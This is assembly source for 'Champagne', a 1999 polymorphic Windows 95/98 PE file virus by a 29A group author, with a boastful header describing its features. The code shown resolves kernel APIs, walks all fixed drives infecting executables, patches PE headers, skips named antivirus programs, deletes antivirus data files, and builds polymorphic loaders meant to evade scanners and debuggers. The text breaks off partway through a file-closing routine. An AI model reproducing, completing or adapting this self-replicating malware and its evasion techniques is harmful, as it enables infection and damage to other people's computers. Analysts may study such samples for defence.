;ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»;
;ºÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»º;
;ººÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»ºº;
;ººº                                                                      ººº;
;ººº                                                                      ººº;
;ººº                   \   *   /                                          ººº;
;ººº    Champagne !!    \*  * /            ÜÛÛÛÛÛÜ ÜÛÛÛÛÛÜ ÜÛÛÛÛÛÜ        ººº;
;ººº                     \*  /             ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ        ººº;
;ººº                      \ /               ÜÜÜÛÛß ßÛÛÛÛÛÛ ÛÛÛÛÛÛÛ        ººº;
;ººº                       Y               ÛÛÛÜÜÜÜ ÜÜÜÜÛÛÛ ÛÛÛ ÛÛÛ        ººº;
;ººº                       I               ÛÛÛÛÛÛÛ ÛÛÛÛÛÛß ÛÛÛ ÛÛÛ        ººº;
;ººº                    ___I___                                           ººº;
;ººº                                                                      ººº;
;ººº                                                                      ººº;
;ººº  Virus written the 22th August 1999 by LethalMind/29A                ººº;
;ººº                                                                      ººº;
;ººº                                      LethalMind@hushmail.com         ººº;
;ººº                                                                      ººº;
;ººÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼ºº;
;ºÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼º;
;ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼;
;= This virus is a polymorphic win 95/98 PE infector. It append to last     =;
;= section and grow its size by 7kb. It grows the file by 7kb exactly       =;
;= because I think that increase by kb will be less noticeable than bytes.. =;
;= It finds the Kernel Base using the [esp] technic and then locate         =;
;= GetProcedure API scanning Kernel32.dll export table... It then use this  =;
;= APIs to get the other The virus is polymorphic and the Delta Offset is   =;
;= hard-coded at encryption time. It uses SEH and will jump to original     =;
;= code if any error occur. This totally avoid users noticing bugs =). The  =;
;= payload will create 500 files in 3 different directories each time the   =;
;= virus is run (ends up with a few files) on 1st of every even month...    =;
;= The file will have 6 randomly chosen characters and a loooong string     =;
;= with greetings and name of virus / creator. I found an interesting fact  =;
;= about long names... If you have winzip shell extension you can't right - =;
;= click it or open the file menu, so deleting these file will give         =;
;= computer newbies to think twice ;) (the del key works though *sigh*).    =;
;= This virus has 3 characteristic (beside the fact that it's my first      =;
;= windows virus =). This virus was ready the 22th of March, but then I     =;
;= kept it and played with it until now... But beta-testers can testify it  =;
;= was already quite neat by this time ;) (just didn't infect ALL disks)    =;
;=                                                                          =;
;=      1ø) Bubble : The polymorphic engine :                               =;
;=      ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ                               =;
;=            It's not a revolutionnary polymorphic engine, but it's        =;
;=        quite a good one... It uses register sliding, multiple opcodes,   =;
;=        randomly generated encryption algorythm, junk generator...        =;
;=            It's slow polymorphic and will change it's decryptor          =;
;=        every day only...                                                 =;
;=                                                                          =;
;=                                                                          =;
;=      2ø) Pyramid Of Glass : The dir walk routine :                       =;
;=      ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ                       =;
;=            Ok, it's not revolutionnary either (wait for 3ø) ;)           =;
;=        This routine will begin with root directory, and go down the      =;
;=        tree structure and will infect every directory on its way         =;
;=        while deleting every Anti-Vir.Dat files.                          =;
;=            Champagne will run down through each 'glass' on its way and   =;
;=        will fill it ;)                                                   =;
;=            This methods has the following advantages :                   =;
;=                - It's quite fast, and faster as time goes (root dir      =;
;=                  only infected once).                                    =;
;=                - It WILL infect the whole disk ('..' method won't)       =;
;=                                                                          =;
;=                                                                          =;
;=      3ø) Alcohol : The Anti-Debug / Anti-Emulation :                     =;
;=      ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ                     =;
;=            This is the part I'm most proud of =)                         =;
;=        Basically, I had finished my poly virus, and decided to scan      =;
;=        it with several scanners... AVP : OK. DRWEB : OK. F-PROT : OK     =;
;=        NODICE... FOUND VIR WIN95.CRYPTED !!! I couldn't release a vir    =;
;=        which was already detected by a scanner ;). I've searched and     =;
;=        tested some things and found that it detected the jump to my      =;
;=        virus... I asked a lot of people, but no one seems to know any    =;
;=        trick to fool AVs in win32... So I decided I needed a way to      =;
;=        hide the jump... since I just studied SEH, I decided to try to    =;
;=        use it ;). So basically, I build an SEH pointing to my virus      =;
;=        and generate an exception !! This worked VERY well since even     =;
;=        a weakly setupped debugger will break its teeth on it. The hard   =;
;=        part was to make that loader poly too, but my generic poly        =;
;=        routines came handy ;).                                           =;
;=                                                                          =;
;=                                                                          =;
;=                                                                          =;
;= Greetings To :                                                           =;
;=      -Laurence, my girlfriend... I _LOVE_ you !!                         =;
;=      -Darkman, my boyfriend.. err, my friend ;)                          =;
;=      -Mist, Thermo, Urgo, Spanska and Mdrg, for being good french coders =;
;=      -29A coders for bringing us the best zines                          =;
;=      -All UC members for being that brave as to stay in that group       =;
;=      -All Kefrens members for lefting UC                                 =;
;=      -SlageHammer and Evul for providing hardware for my project (Niark  =;
;=       niark)                                                             =;
;=      -Pockets for teaching me all the DOS things                         =;
;=      -Trevelyan aka Virus-X for making each day something so stupid I    =;
;=       die from laughing and providing me with fresh logs for my site.    =;
;=      -GigaCake for being a girl and yet manage to stay with us :)        =;
;=      -Pharmie for talking to me when I wasn't coding ;)                  =;
;=      -Morphine for being so kind and also to say sorry for not coming :( =;
;=                                                                          =;
;=      -All the guys on IRC for entertaining me when I was bored/ill :D    =;
;=                                                                          =;
;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=;

; I commented fully the first part, and I didn't fully comment last part, as
; the code was very self explanatory (I use small routine with explicit names)

.486p
.model flat,stdcall
locals
jumps


;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
; Some 29A includes really useful for win32 programmation and some equates
;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

include           Useful.inc
include           Win32API.inc
include           MZ.inc
include           PE.inc

OffsetToEncrypted equ  offset StartOfEncryptedData - offset START_VIRUS
SizeOfEncrypted   equ  offset (EndCrypted - offset StartOfEncryptedData)/4-3
GENERIC_RW        equ  GENERIC_WRITE or GENERIC_READ
DRIVE_FIXED       equ  3
SIZETOADD         equ  (((VirSize) / 1024d)+1)*1024d
VirSize           equ  offset END_VIRUS - offset START_VIRUS + 5d


;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
; Only for first generation...
;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

extrn      ExitProcess:PROC

;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
; Start of host file : just a loader as the virus will create
; and a call to exit process...
;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

.data                                    ; DATA segment
      db      'LM'                       ; Dummy data so TASM won't cry
      
.code                                    ; CODE segment
start:
HostFile:
      call     NEXT                      ; Install SEH
                                         ; Handler (jump to the virus)
      mov      esp,[esp+08]              ; Restore stack
      mov      eax,offset START_VIRUS    ; EAX = adress of jump
      push     eax                       ;
      ret                                ; Go to the code


NEXT:
      xor      edx,edx                   ; Install dummy handler
      push     fs:dword ptr[edx]         ;
      mov      fs:[edx],esp              ;
      mov      BYTE PTR [edx],0          ; Cause an exception
                                         ; -> jump to handler

; Some nop to fill the host file
EndHost:
      db       100d dup (90h)
      push     0
      call     ExitProcess

;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; Here come the real code !!
;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

SEH_Handler macro                        ; exception handler, return to host
      jmp      Remove_Exception_Registration
endm


START_VIRUS:
      mov      ebp,0                     ; This is patched at infection time
      org      $-4                       ;
HardDelta      dd       0                ;
      call     Decryptor                 ; Call polymorphic decryptor
                                         ; (just a ret in 1st gen)
StartOfEncryptedData:                    ; From now on, everything is
                                         ; encrypted
      @SEH_RemoveFrame                   ; Remove the dummy handler
      mov      ecx,[esp]                 ; Get [esp] to find kernel base
      pushad                             ; Save all register to restore them
                                         ;
      @SEH_SetupFrame <SEH_Handler>      ; Setup real SEH
                                         ;
      push     ecx                       ; Save [esp]
                                         ;
      mov      eax,[SavedIE+ebp]         ; Save initial EIP in another var.
      mov      [SavedIE2+ebp],eax        ;
      lea      esi,[OriginalHost+ebp]    ; Restore host
      mov      edi,eax                   ; (If we ever crash we'll jump direct
      push     100d                      ; to the good code, no need to worry)
      pop      ecx                       ;
      rep      movsb                     ; Do it
      pop      ecx                       ; ECX = [ESP]
                                         ;
GetKrnlBaseLoop:                         ; Get Kernel32 module base adress
      xor      edx,edx                   ;
      dec      ecx                       ;
      mov      dx,[ecx+03ch]             ;
      test     dx,0f800h                 ;
      jnz      GetKrnlBaseLoop           ;
      cmp      ecx,[ecx+edx+34h]         ;
      jnz      GetKrnlBaseLoop           ;
      mov      [KernelAdress+ebp],ecx    ; ecx hold KernelBase... Store it

;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
; This code is 'inspired' a lot from jqwerty's... I modified
; it to suit my virus' need, but it's basically his...
; Hope you don't mind :)
;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

      push     ebp                       ; Save ebp
      mov      [RelocateEBP+ebp],ebp     ; Relocate part of code since ebp
                                         ; is trashed
      mov      eax,ecx                   ; EAX = KernelBase
      mov      ebx,eax                   ; EBX = KernelBase
      add      eax,[eax.MZ_lfanew]       ; Get address of PE header
      mov      ebp,ebx                   ; Get address of Export directory
      add      ebp,[eax.NT_OptionalHeader             \
                                .OH_DirectoryEntries  \
                                .DE_Export            \
                                .DD_VirtualAddress]
      mov      edx,ebx                        ; Get address of exported
      add      edx,[ebp.ED_AddressOfNames]    ; API names
      mov      ecx,[ebp.ED_NumberOfNames]     ; Get number of exported
      xor      eax,eax                        ; API names

Search_for_API_name:
      mov      esi,ebx                   ; Get address of next exported
      add      esi,[edx+eax*4]           ; API name
      lea      edi,[sGetProc]            ; Get address of GetProc
      add      edi,12345678h             ; Relocate it (DOH)
      org      $-4                       ;
RelocateEBP    dd      0                 ;
Next_Char_in_API_name:
      cmpsb                              ; Is first char the same ?
      jz       Matched_char_in_API_name  ; Yes, maybe it's the one we want
      inc      eax                       ; Nope, next name....
      loop     Search_for_API_name

Matched_char_in_API_name:
      cmp      byte ptr [esi-1],0        ; We're at the end of exported name ?
      jnz      Next_Char_in_API_name     ; No, jump
      mov      edx,ebx                   ; Get address of exp. API ordinal
      add      edx,[ebp.ED_AddressOfOrdinals]
      movzx    eax,word ptr [edx+eax*2]  ; Get index into exp.API functions

Check_Index:
      mov      edx,ebx                   ; Get address of exported API fct
      add      edx,[ebp.ED_AddressOfFunctions]
      add      ebx,[edx+eax*4]           ; Get address of requested API fct
      mov      eax,ebx                   ;
      sub      ebx,ebp                   ; Take care of forwarded API fct

End_GetProcAddressET:
      pop      ebp                       ; Restore delta offset
      mov      [aGetProc+ebp],eax        ; Save GetProc adress

;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
; This loop use the GetProcAdress function to find all my API's
; adress, and store them into an array...
;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

      lea      edi,DWORD PTR [beginAPIlist+ebp]
      lea      edx,DWORD PTR [ebp+beginAPIAdress]
      
      push     NumberOfAPIs               ; Setup loop counter
      mov      ebx,[KernelAdress+ebp]
      pop      ecx                        ;
LoopGetAPI:                               ;
      push     ecx                        ; Push loop counter
      push     edi                        ;
      push     edx                        ; Push adress index
      push     edi                        ; Push name of needed function
      push     ebx                        ; Push Kernel Base in mem.
                                          ;
      call     [aGetProc+ebp]             ; Call GetProc
                                          ;
      pop      edx                        ; Restore index in adress array
      mov      [edx],eax                  ; Store adress to array
      pop      edi                        ;
LoopNextAPIN:                             ;
      inc      edi                        ; Increment edi
      cmp      BYTE PTR [edi],0           ; Are we at the end of the string ?
      jne      LoopNextAPIN               ; No, loop
      inc      edi                        ; Yes, get to next string
      add      edx,4                      ; Get to next adress (dd = 4)
      pop      ecx                        ; Restore loop counter
      loop     LoopGetAPI                 ; loop

;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
; Init the random number generator.. Using day as seed make the result of
; an infection change every hour... Not very good for infecting 100000 files
; I use also a 'fast' random number generator for the walk dir routine
;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

      lea      eax,dword ptr [ebp+my_system_time]
      push     eax                        ; push time structure
      call     [aGetSystemTime+ebp]       ; GetSytemTime
      mov      ebx,dword ptr [ebp+time_dayofweek] ; Use Day as random seed
      mov      dword ptr [ebp+rnd32_seed],ebx     ;
      mov      eax,dword ptr [ebp+time_seconds]   ; Use Seconds as random seed
      not      eax                                ;
      neg      eax                                ;
      mov      dword ptr [ebp+rnd32_seedfast],eax ;

      call     Payload                            ; call Payload
      mov      BYTE PTR [BaseDisk+ebp],'C'-1

StartDrive:
      inc      BYTE PTR [BaseDisk+ebp]
      cmp      BYTE PTR [BaseDisk+ebp],'Z'
      jg       InfectWindowsDirectory
      lea      esi,[BaseDisk+ebp]
      push     esi
      call     [ebp+aGetDriveTypeA]
      cmp      eax,DRIVE_FIXED
      jnz      StartDrive

InfectDrive:
      lea      esi,[BaseDisk+ebp]            ; Setup directory search
      push     esi                           ;
      call     [aSetCurrentDirectory+ebp]    ; Set it at current directory
NextDir:
      lea      ecx,[FindData+ebp]            ; ECX = FindData
      lea      edx,[EXEMask+ebp]             ; EDX = SearchMask
      call     InfectFolder                  ; Infect the folder
                                             ;
      call     BrowseDirectory               ; Now enter a random directory
      test     eax,eax                       ; If the function returned eax!=0
      jne      NextDir                       ; Then we can proceed
      jmp      StartDrive
InfectWindowsDirectory:
      lea      edx,[DirectoryBuffer+ebp]
      push     edx
      push     MAX_PATH
      push     edx                           ;
      call     [aGetWindowsDirectory+ebp]    ; Next fill Windows Directory
      pop      edx
      push     edx
      call     [aSetCurrentDirectory+ebp]    ; Set it at current directory
      lea      edx,[EXEMask+ebp]
      lea      ecx,[FindData+ebp]
      call     InfectFolder                  ; Infect the folder

RestoreHostandjump:
Remove_Exception_Registration:
      @SEH_RemoveFrame                  ; Remove SEH handler before returning
      popad                             ; Restore registers
      mov      ebx,[SavedIE2+ebp]       ; EBX = Entry Point
      push     ebx                      ; push it
      ret                               ; Return control to host


;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
; Infect all the file in a folder.
; Parameters are :
;    - ECX = Pointer to FIND_DATA
;    - EDX = Pointer to Search Mask
;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

InfectFolder proc
      push     ecx                        ; Save FindData
      push     ecx                        ; Push Find data
      push     edx                        ; Push Mask
      call     [ebp+aFindFirstFileA]      ; Find FirstFile
      pop      ecx                        ; Restore FindData
      inc      eax                        ; Is there at least ONE file ?
      jz       EndSearch2                 ; No, EndSearch
      dec      eax                        ; Restore handle
      push     eax                        ; Save search handle

ProcessFile:
      mov      eax,DWORD PTR [ecx.WFD_szFileName]
      cmp      eax,'NACS'                 ; Don't infect a few AVs
      je       FindAnother                ;
      cmp      eax,'EWRD'                 ;
      je       FindAnother                ;
      cmp      eax,'VABT'                 ;
      je       FindAnother                ;
      cmp      eax,'WVAP'                 ;
      je       FindAnother                ;
      cmp      eax,'3PVA'                 ;
      je       FindAnother                ;
      cmp      eax,'1PVA'                 ;
      je       FindAnother                ;
      cmp      eax,'3DON'                 ;
      je       FindAnother                ;
      cmp      eax,'.DON'                 ;
      je       FindAnother                ;
      cmp      eax,'RP-F'                 ;
      je       FindAnother                ;
      cmp      eax,'WVAN'                 ;
      je       FindAnother                ;
      cmp      eax,'TVAN'                 ;
      je       FindAnother                ;
      call     Open&MapFile               ; Open and Map file in memory
      jc       FindAnother                ; Can't open ? Forget this file :)
      call     CheckIfFileIsOk            ; Is File infectable ?
      jc       CloseFile                  ; No ? Close and get next...
                                          ;
      call     InfectFile                 ; Else we breed =)
                                          ;
CloseFile:                                ;
      call     Close&UnMapFile            ; Close file handle and unmap it
                                          ;
FindAnother:                              ;
      pop      eax                        ; Restore search handle
      push     eax                        ; Push it =)
      push     eax                        ; Push again...
      pop      ecx                        ; .. to put it in ECX
      lea      edx,[FindData+ebp]         ; EDX = FIND_DATA
      push     edx                        ; Push it too
      push     ecx                        ; Push search handle
      call     [ebp+aFindNextFileA]       ; Find Next File
      test     eax,eax                    ; Is there any other file ?
      jz       EndSearch                  ; No, go away
      lea      ecx,[FindData+ebp]         ; EcX = FIND_DATA
      jmp      ProcessFile                ; YES !! Infect it too :)
                                          ;
EndSearch:
      call     [ebp+aFindClose]           ; FileHandle is already pushed, close it
EndSearch2:                               ;
      ret                                 ; The End..
InfectFolder endp


;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
; Infect a file (We already checked if it was ok)
;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

InfectFile proc
      call     Close&ReOpenRW             ; Close and re-open the file in RW mode
      mov      ax,word ptr [esi+2]        ; Get infos from standard header...
      xor      ax,word ptr [esi+14h]      ; XOR it
      xor      ax,word ptr [esi]          ; XOR again
      mov      word ptr [esi+12h],ax      ; Store the computed value in checksum
                                          ;
      add      esi,[esi+3ch]              ; ESI = Beginning of PE header
      mov      [PEHeader+ebp],esi         ; Save it
      mov      ebx,[esi+3ch]              ; EBX = File align
      mov      [FileAlign+ebp],ebx        ; Save it
      mov      ebx,[esi+38h]
      mov      [ObjectAlign+ebp],ebx
      mov      ebx,[esi+74h]              ; EBX = Number of directories
      shl      ebx,3                      ; EBX * SizeOfEntries
      movzx    eax,WORD PTR [esi+6h]      ; EAX = Number of sections
      dec      ax                         ; We want last
      mov      ecx,IMAGE_SIZEOF_SECTION_HEADER      ; ECX = Size of header
      mul      ecx                        ; EAX = Number of section * Size of header
      add      esi,078h                   ; Jump over PE header
      add      esi,ebx                    ; Jump over directory entries
      mov      [FirstSection+ebp],esi     ; Save adress of FIRST section
      add      esi,eax                    ; Get to last section header
      or       DWORD PTR [esi.SH_Characteristics], \  ; Mark as contain comments
               (IMAGE_SCN_CNT_CODE OR \               ; Readeable and writeable
                IMAGE_SCN_MEM_EXECUTE OR \            ;
                IMAGE_SCN_MEM_WRITE)                  ;
      add      [esi.SH_VirtualSize],VirSize+VirtualAdd; Increase Size by
                                                      ; Size of vir

      mov      eax,[esi.SH_VirtualSize]   ; Get new virtual size
      push     eax                        ; Save it
      mov      ecx,[FileAlign+ebp]        ; Get align
      push     ecx                        ; Save it
      div      ecx                        ; EDX = Byte depassing padding
      pop      ecx                        ; ECX = file align
      sub      ecx,edx                    ; ECX = Byte to add to round up
      pop      eax                        ; EAX = Virtual Size
      add      eax,ecx                    ; Add bytes to pad
      mov      [esi.SH_SizeOfRawData],eax ; Change header
      
      mov      ebx,[esi.SH_VirtualAddress] ; Virtual Adress
      add      ebx,[esi.SH_VirtualSize]    ; + Virtual Size
      sub      ebx,VirSize                 ; - VirSize
                                           ; = Virus' Entry Point

      pushad
      mov      eax,[esi.SH_VirtualAddress] ; Get new virtual size
      add      eax,[esi.SH_VirtualSize]    ; + Virtual Size
      push     eax                         ; Save it
      mov      ecx,[ObjectAlign+ebp]       ; Get align
      push     ecx                         ; Save it
      div      ecx                         ; EDX = Byte depassing padding
      pop      ecx                         ; ECX = file align
      sub      ecx,edx                     ; ECX = Byte to add to round up
      pop      eax                         ; EAX = Virtual Size
      add      eax,ecx                     ; Add bytes to pad
      mov      ebx,[PEHeader+ebp]
      add      [ebx+50h],eax               ; Change header
      popad


      mov      edx,[PEHeader+ebp]          ; Get PEHeader
      push     edx                         ; Save it
      add      ebx,[edx+34h]               ; Add to new entry point image base

      mov      edi,[esi.SH_PointerToRawData] ; Get pointer to section in file
      add      edi,[esi.SH_VirtualSize]    ; Go to the end
      sub      edi,VirSize                 ; Take size of Vir back
      add      edi,[MappedBA+ebp]          ; Where is it in our memory ?
      pop      esi                         ; ESI = PE Header
      push     edi                         ; Save it

      mov      eax,[esi+28h]               ; Get EIP RVA
      push     eax                         ; Save it
      add      eax,[esi+34h]               ; Add image base
      mov      [SavedIE+ebp],eax           ; Save it

      mov      eax,[FirstSection+ebp]      ; EAX = First section in file
      or       DWORD PTR [eax.SH_Characteristics],IMAGE_SCN_MEM_WRITE
	                                     ; We must restore
      pop      esi                         ; ESI = EIP RVA
      add      esi,[eax.SH_PointerToRawData] ; Get the EIP in the mapped file
      sub      esi,[eax.SH_VirtualAddress]   ;
      add      esi,[MappedBA+ebp]            ;
      push     esi                        ; Save it
      lea      edi,[OriginalHost+ebp]     ; Save 100 first bytes of host
      push     100d                       ; So we can insert our poly
      pop      ecx                        ; debugger-emulator killer =)
      rep      movsb                      ; Do it
                                          ;
      pop      edi                        ; EDI = EIP in mapped file
      push     ebx                        ; EBX = Virtual Entry Point
      sub      ebx,offset START_VIRUS     ; Calculate DELTA OFFSET of new file
      mov      [HardDelta+ebp],ebx        ; Store it
                                          ;
      pop      ebx                        ; EBX = Virtual Entry Point
      call     PolyLoader                 ; Generate a polymorphic loader
                                          ;
      lea      esi,[CryptorInstructions+ebp]  ; Reset Cryptor with nop's
      lea      edi,[EndCryptor+ebp]       ;
ResetLoop:                                ;
      mov      BYTE PTR [esi],90h         ;
      inc      esi                        ;
      cmp      esi,edi                    ;
      je       EndResetCryptor            ;
      jmp      ResetLoop                  ;
EndResetCryptor:                          ;
      pop      edi                        ; EDI = Start of virus in memory
      push     edi                        ;
      call     Poly                       ; Generate a polymorph crpt/dcrpt
      pop      edi                        ;
      push     edi                        ; Write virus with decryptor
      lea      esi,[START_VIRUS+ebp]      ;
      push     VirSize                    ;
      pop      ecx                        ;
      rep      movsb                      ;
                                          ;
      pop      edi                        ; EDI = Start of vir in mem
      add      edi,StartOfEncryptedData - START_VIRUS ; EDI -> encrypted part
      mov      esi,edi                    ; ESI too =)
      push     SizeOfEncrypted            ;
      pop      ecx                        ;
      jmp      Cryptor                    ; Crypt it using generated cryptor
InfectFile endp


;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
; Check if the mapped file is good for infection (real PE, not infected)
;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-


CheckIfFileIsOk      proc
      cmp      WORD PTR [esi],'ZM'        ; Is it a real EXE ?
      jne      CheckErr                   ; No, forget it
      mov      ax,word ptr [esi+2]        ; Calculate infected checksum
      xor      ax,word ptr [esi+14h]      ;
      xor      ax,word ptr [esi+0h]       ;
      cmp      ax,word ptr [esi+12h]      ; Is it infected ?
      je       CheckErr                   ; Yes, forget it
      mov      ebx,[esi+3ch]              ; Get adress of PE header
      cmp      ebx,200h                   ; (only if <200, we could cause read
                                          ; error in non-PE small files)
      ja       CheckErr                   ; Higher than 200, jump
      cmp      word ptr [ebx+esi],'EP'    ; Is it a PE ?
      jne      CheckErr                   ; No, forget it
      add      esi,ebx                    ; Go to PE Header
      mov      [PEHeader+ebp],esi         ; Save PE Header adress
      clc                                 ; Clear carry
      ret                                 ;
CheckErr:                                 ;
      stc                                 ; Error, set the carry
      ret                                 ;
CheckIfFileIsOk endp


;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
; Open and map file in memory in read only mode...
;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-


Open&MapFile proc
      lea      edi,[FindData.WFD_szFileName+ebp]
      push     edi                        ; Push name buffer
      call     [ebp+aGetFileAttributesA]  ; Get File Attributes
      mov      [ebp+SavedAttrib],eax      ; Save them
                                          ;
      push     80h                        ; Reset them
      push     edi                        ; Push name buffer 
      call     [ebp+aSetFileAttributesA]  ; Reset attributes
                                          ;
      cdq                                 ; xor edx,edx
      push     edx                        ;
      push     edx                        ;
      push     OPEN_EXISTING              ;
      push     edx                        ;
      push     edx                        ;
      push     GENERIC_RW                 ;
      push     edi                        ;
      call     [aCreateFileA+ebp]         ; Open the file
                                          ;
      inc      eax                        ; Check for errors
      jz       O&MFErr                    ; Yeah, go away
      dec      eax                        ; No, restore eax
      mov      [FileHandle+ebp],eax       ; And save it
                                          ;                                    ;
      lea      edx,[SavedCreationT+ebp]   ;
      push     edx                        ;
      lea      edx,[SavedLastWriteT+ebp]  ;
      push     edx                        ;
      lea      edx,[SavedLastAccesT+ebp]  ;
      push     edx                        ;
      mov      edx,[FileHandle+ebp]       ;
      push     edx                        ;
      call     [aGetFileTimeA+ebp]        ; Save File Time
                                          ;
      mov      ecx,[FindData.WFD_nFileSizeLow+ebp]
      cdq                                 ; xor edx,edx
      push     edx                        ;
      push     ecx                        ;
      push     edx                        ;
      push     PAGE_READONLY              ;
      push     edx                        ;
      mov      ecx,[FileHandle+ebp]       ;
      push     ecx                        ;
      call     [aCreateFileMappingA+ebp]  ; Create Mapping in read only mode
      mov      [MapHandle+ebp],eax        ; Save MapHandle
      cdq                                 ; xor edx,edx
      push     edx                        ;
      push     edx                        ;
      push     edx                        ;
      push     FILE_MAP_READ              ;
      push     eax                        ;
      call     [ebp+aMapViewOfFile]       ; View map of file
      mov      [ebp+MappedBA],eax         ; Save its adress in memory
      xchg     eax,esi                    ; Put it in esi
      clc                                 ; Say everything was fine
      ret                                 ; and quit
O&MFErr:                                  ;
      stc                                 ; We did a mess..
      ret                                 ; Quit
Open&MapFile endp


;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
; Close and unmap the file from memory... (DOH)
; I don't feel like commenting this one, 'cause it's pretty self-explanatory
;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

Close&UnMapFile proc
      mov      eax,[ebp+MappedBA]
      push     eax
      call     [ebp+aUnmapViewOfFile]

      mov      eax,[MapHandle+ebp]
      push     eax
      call     [ebp+aCloseHandle]

      lea      edx,[SavedCreationT+ebp]      ; Restore saved time
      push     edx
      lea      edx,[SavedLastWriteT+ebp]
      push     edx
      lea      edx,[SavedLastAccesT+ebp]
      push     edx
      push     [FileHandle+ebp]
      call     [aSetFileTime+ebp]

      mov      eax,[FileHandle+ebp]
      push     eax
